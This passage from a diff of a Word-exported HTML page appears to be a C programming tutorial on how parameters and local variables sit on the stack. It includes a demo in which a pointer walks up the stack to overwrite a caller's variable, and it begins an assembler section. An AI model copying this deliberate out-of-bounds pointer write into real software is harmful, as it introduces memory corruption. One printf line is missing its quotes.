+mso-fareast-font-family:"MS Mincho";color:#000066'>abc(int i1, int j1)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int i,j;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;i1=%p j1=%p
+i=%p j=%p abc\n&quot;,&amp;i1, &amp;j1 , &amp;i,&amp;j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>pqr(int k1 , int l1)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int k,l;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;k1=%p l1=%p
+k=%p l=%p pqr\n&quot;,&amp;k1, &amp;l1 , &amp;k,&amp;l);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>xyz(int i1, int j1)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int i,j;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;i1=%p j1=%p
+i=%p j=%p xyz\n&quot;,&amp;i1, &amp;j1 , &amp;i,&amp;j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>i1=0xbfffe180 j1=0xbfffe184
+i=0xbfffe174 j=0xbfffe170 abc<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>k1=0xbfffe180 l1=0xbfffe184
+k=0xbfffe174 l=0xbfffe170 pqr<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>i1=0xbfffe180 j1=0xbfffe184
+i=0xbfffe174 j=0xbfffe170 xyz<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>i1=0xbfffe180 j1=0xbfffe184
+i=0xbfffe174 j=0xbfffe170 abc<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>This program is a merger of
+the above two programs. The functions names are the same but now, not only do
+they accept two parameters, the function further creates two local variables on
+the stack. Printing out the addresses of the local variables and the parameters
+bring no surprises at all. They all remain the same for every function.<span
+style="mso-spacerun: yes">  </span><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>A detailed version follows. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The value of 1 and 2 given
+to function abc are passed on to parameters i1 and j1. These parameters to
+functions take up some area in memory, which is called the stack. The internals
+of stack memory will be explained in just a short while. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The parameters that are
+passed to a function are placed on the stack in the reverse order, therefore
+first 2 goes on this stack memory and then 1. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>For sake of understanding,
+lets take the actual values, where the stack begins at memory location
+0xbfffe188. The value 2 is pushed or copied at this memory location thus moving
+the stack pointer to 0xbfffe184 and giving this address to j1, followed by 1
+which is four memory locations away, i.e 0xbfffe180. This is very much proved
+by the program output, which show the same address locations for parameters i1
+and j1.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Once the values are placed
+on the stack, the function code is executed. This function, abc, creates two
+local variables i and j. These are created at positions 0xbfffe174 and
+0xbfffe170 as per the output. This goes to prove that besides parameters, local
+variables also use up the stack memory. The difference of 12 bytes between the
+parameters and variables is given to function call.<span style="mso-spacerun:
+yes">  </span>We know why but hang on, one concept at a time.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Now when the function quits
+out, the stack resets back to its original position of 0xbfffe188. A sure indication
+that someone moves the current memory pointer/the stack pointer up by 24 bytes.
+And, the same process is repeated for all function calls.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc(1,2);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc(int i1, int j1)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int i,j;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;i1=%p j1=%p
+i=%p j=%p abc\n&quot;,&amp;i1, &amp;j1 , &amp;i,&amp;j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>pqr(3,4);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>pqr(int k1 , int l1)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int k,l;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;k1=%p l1=%p
+k=%p l=%p pqr\n&quot;,&amp;k1, &amp;l1 , &amp;k,&amp;l);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>xyz(5,6);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>aaa(8,9);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>xyz(int i1, int j1)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int i,j;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;i1=%p j1=%p
+i=%p j=%p xyz\n&quot;,&amp;i1, &amp;j1 , &amp;i,&amp;j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>aaa(int i1, int j1)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int i,j;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;i1=%p j1=%p
+i=%p j=%p aaa\n&quot;,&amp;i1, &amp;j1 , &amp;i,&amp;j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>i1=0xbfffe300 j1=0xbfffe304
+i=0xbfffe2f4 j=0xbfffe2f0 abc<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>k1=0xbfffe2e0 l1=0xbfffe2e4
+k=0xbfffe2d4 l=0xbfffe2d0 pqr<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>i1=0xbfffe2c0 j1=0xbfffe2c4
+i=0xbfffe2b4 j=0xbfffe2b0 xyz<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>i1=0xbfffe2c0 j1=0xbfffe2c4
+i=0xbfffe2b4 j=0xbfffe2b0 aaa<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The above program reinforces
+the same principles that parameters and local variables are created on the
+stack. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The entry point function
+main calls function abc. The stack memory now starts at memory 0xbfffe308, the
+variables i and j are created at the memory locations 0xbfffe2f4 and 0xbfffe2f0
+respectively. There is a gap of 12 bytes as seen before.<span
+style="mso-spacerun: yes">  </span><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>At this point, the stack
+pointer is positioned at 0xbfffe2e8. When function pqr is called from within
+abc, the parameters 4 and 3 are pushed on the stack. This is in the reverse
+order, therefore first 4 goes on the stack at 0xbfffe2e4 and then 3 at
+0xbfffe2e0. These become the addresses of parameters k1 and l1 respectively.
+The call then allocates 12 bytes on the stack for itself, thus giving the
+variables k and l the address of 0xbfffe2d4 and 0xbfffe2d0 respectively. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The next two function-call
+of xyz and aaa both give the same values. For the call of function xyz with
+function pqr, the stack is now at 0xbfffe2c8. The parameters 5 and 6 are pushed
+at address location 0xbfffe2c4 and 0xbfffe2c0 respectively. The variables i and
+j then are allocated after moving 12 away, thus end up at locations 0xbfffe2b4
+and 0xbfffe2b0. When this function ends, the system moves the stack up the same
+amount that it moved down. Therefore, the stack at the end of the call of xyz
+will come to location 0xbfffe2c8. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The call of the aaa function
+follows the same process, thus bringing the stack back to 0xbfffe2c8 in the
+end. And the same goes for function pqr. As a result, at the end of each
+function, the stack moves back to where it was before the function is called. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>This theory can be tried out
+with as many functions, but eventually, each will see the stack return to the
+same position it started. These functions in turn may call as many functions as
+well, however the same rules apply. At the end of a function call, the stack
+moves up as much as it had moved down. Each one cleans up its own mess. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int i,j;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>i = 2;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>j = 3;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;Address of i=%p
+j=%p\n&quot;,&amp;i,&amp;j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc(i,j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;i=%d\n&quot;,i);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int abc(int x, int y)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int *z;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;Address of z=%p
+x=%p y=%p\n&quot;,&amp;z,&amp;x,&amp;y);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>z = &amp;y;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;z=%p\n&quot;,z);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>z++;z++;z++;z++;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;z=%p\n&quot;,z);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>*z = 8;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Address of i=0xbffff594
+j=0xbffff590<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Address of z=0xbffff574
+x=0xbffff580 y=0xbffff584<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>z=0xbffff584<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>z=0xbffff594<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>i=8<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>This last example on stack
+shows how dangerous stack manipulation can get. The function main is the first function
+to be called and in all other aspects, it behaves in a similar manner like the
+other functions when dealing with stack memory. The local variables i and j in
+main are also created on the stack at 0xbffff594 and 0xbffff590. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The call to function abc
+will place the values 3 and 2 on the stack at locations 0xbffff580 and
+0xbffff584 before taking up 12 bytes for itself. The parameters x and y are at
+the above addresses. The pointer variable z is stored at location 0xbffff574.
+This variable is initialized to address of parameter y, which is a value of
+0xbffff584. Thereafter, z is incremented by 16, hence its new value is
+0xbffff594. But, if you remember, this is the address occupied by variable i. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Further, using the features
+of pointers, a value of 8 is written to this location, thereupon actually
+changing the value of variable i. This is the power of pointers. One pointer
+variable, if it wants can overwrite the value of a variable in another function
+indirectly. Since, all local data is stored on the stack, it is susceptible to
+being overwritten.<span style="mso-spacerun: yes">  </span>Therefore, call
+someone else's function with care.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Assembler code in C programs<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The next series of programs
+explain assembler programming. We believe that every programmer in the world
+should understand assembler. Unfortunately, our view is not held by the
+majority. It does not matter which language you use to write your code in, when
+it finally executes, it will be assembler code and not your favorite language
+code that executes. We are not suggesting that you write your code in
+assembler, all that we are saying is using assembler helps in understand the
+internals of computing better. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>A microprocessor or a
+computer is made up of entities or memory called registers. These registers are
+the basic building blocks that any assembler programmer works with and they are
+given names like eax, ebx etc. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Whenever we encounter the
+return instruction in C like 'return 100', two things happen. One, the value
+100 is placed in the eax register and two, the function ends thus control goes
+back to the function that called it. It is assumed here that any value returned
+by the called function will be found in the eax register. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int i;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>i=abc();<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(%d\n,i);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int abc()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>return 100;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
